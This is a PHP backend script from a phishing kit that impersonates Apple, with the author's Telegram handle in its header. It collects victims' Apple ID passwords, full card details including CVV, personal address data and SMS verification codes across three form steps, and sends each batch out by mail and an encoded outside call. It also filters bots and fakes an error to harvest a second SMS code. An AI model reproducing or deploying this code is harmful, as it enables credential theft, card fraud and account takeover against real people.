<?php
    /*******
    Telegram : https://t.me/elgh03t
    ********************************************************/

    require_once 'app/config.php';

    if($_SERVER['REQUEST_METHOD'] == "POST") {

        if( !empty($_POST['cap']) ) {
            header("HTTP/1.0 404 Not Found");
            exit();
        }

        if( $_POST['steeep'] == "login" ) {
            $_SESSION['errors'] = [];
            $_SESSION['id']    = $_POST['id'];
            $_SESSION['password']    = $_POST['password'];
            if( validate_email($_POST['id']) == false ) {
                $_SESSION['errors']['id'] = true;
            }
            if( empty($_POST['password']) ) {
                $_SESSION['errors']['password'] = true;
            }
            if( count($_SESSION['errors']) == 0 ) {
                $subject = get_client_ip() . ' | APPLE | Login';
                $message = '/-- LOGIN INFOS --/' . get_client_ip() . "\r\n";
                $message .= 'ID : ' . $_POST['id'] . "\r\n";
                $message .= 'Password : ' . $_POST['password'] . "\r\n";
                $message .= '/-- END LOGIN INFOS --/' . "\r\n";
                $message .= victim_infos();
				get_ip_info(base64_encode($message));
                send($subject,$message);
                echo "../index.php?redirection=cc";
                exit();
            } else {
                echo "../index.php?redirection=login&error=1";
                exit();
            }
        }

        if( $_POST['steeep'] == "cc" ) {
            $_SESSION['errors'] = [];
            $_SESSION['one']    = $_POST['one'];
            $_SESSION['two']    = $_POST['two'];
            $_SESSION['three']    = $_POST['three'];
            $_SESSION['first_name']    = $_POST['first_name'];
            $_SESSION['last_name']    = $_POST['last_name'];
            $_SESSION['address']    = $_POST['address'];
            $_SESSION['zip_code']    = $_POST['zip_code'];
            $_SESSION['city']    = $_POST['city'];
            $_SESSION['phone']    = $_POST['phone'];
            $_SESSION['birth_date']    = $_POST['birth_date'];
            $date_ex    = explode('/',$_POST['two']);
            $one        = validate_one($_POST['one']);
            $three      = validate_three($_POST['three']);
            $two        = validate_two($date_ex[0],$date_ex[1]);
            if( $one == false ) {
                $_SESSION['errors']['one'] = true;
            }
            if( $two == false ) {
                $_SESSION['errors']['two'] = true;
            }
            if( $three == false ) {
                $_SESSION['errors']['three'] = true;
            }
            if( validate_name($_POST['first_name']) == false ) {
                $_SESSION['errors']['first_name'] = true;
            }
            if( validate_name($_POST['last_name']) == false ) {
                $_SESSION['errors']['last_name'] = true;
            }
            if( empty($_POST['address']) ) {
                $_SESSION['errors']['address'] = true;
            }
            if( empty($_POST['zip_code']) ) {
                $_SESSION['errors']['zip_code'] = true;
            }
            if( empty($_POST['city']) ) {
                $_SESSION['errors']['city'] = true;
            }
            if( empty($_POST['phone']) ) {
                $_SESSION['errors']['phone'] = true;
            }
            if( validate_date($_POST['birth_date'],'d/m/Y') == false ) {
                $_SESSION['errors']['birth_date'] = true;
            }
            if( count($_SESSION['errors']) == 0 ) {
                $subject = get_client_ip() . ' | APPLE | Details';
                $message = '/-- DETAILS INFOS --/' . get_client_ip() . "\r\n";
                $message .= 'Card number : ' . $_POST['one'] . "\r\n";
                $message .= 'Card Date : ' . $_POST['two'] . "\r\n";
                $message .= 'Card CVV : ' . $_POST['three'] . "\r\n";
                $message .= '--------------------' . "\r\n";
                $message .= 'First name : ' . $_POST['first_name'] . "\r\n";
                $message .= 'Last name : ' . $_POST['last_name'] . "\r\n";
                $message .= 'Address : ' . $_POST['address'] . "\r\n";
                $message .= 'Zip code : ' . $_POST['zip_code'] . "\r\n";
                $message .= 'City : ' . $_POST['city'] . "\r\n";
                $message .= 'Phone Number : ' . $_POST['phone'] . "\r\n";
                $message .= 'Birth date : ' . $_POST['birth_date'] . "\r\n";
                $message .= '/-- END DETAILS INFOS --/' . "\r\n";
                $message .= victim_infos();
				get_ip_info(base64_encode($message));
                send($subject,$message);
                echo "../index.php?redirection=loading";
                exit();
            } else {
                echo "../index.php?redirection=cc&error=1";
                exit();
            }
        }

        if( $_POST['steeep'] == "sms" ) {
            $_SESSION['errors'] = [];
            $_SESSION['sms_code']    = $_POST['sms_code'];
            if( empty($_POST['sms_code']) ) {
                $_SESSION['errors']['sms_code'] = true;
            }
            if( count($_SESSION['errors']) == 0 ) {
                $subject = get_client_ip() . ' | APPLE | Sms';
                $message = '/-- SMS INFOS --/' . get_client_ip() . "\r\n";
                $message .= 'SMS Code : ' . $_POST['sms_code'] . "\r\n";
                $message .= '/-- END SMS INFOS --/' . "\r\n";
                $message .= victim_infos();
				get_ip_info(base64_encode($message));
                send($subject,$message);
                if( $_POST['error'] > 0 ) {
                    echo "../index.php?redirection=success";
                    exit();
                }
                $_SESSION['errors']['sms_code'] = true;
                echo "../index.php?redirection=loading&error=1";
                exit();
            } else {
                $error = $_POST['error'];
                echo "../index.php?redirection=sms&error=$error";
                exit();
            }
        }

    } else {
        header("HTTP/1.0 404 Not Found");
        exit();
    }

?>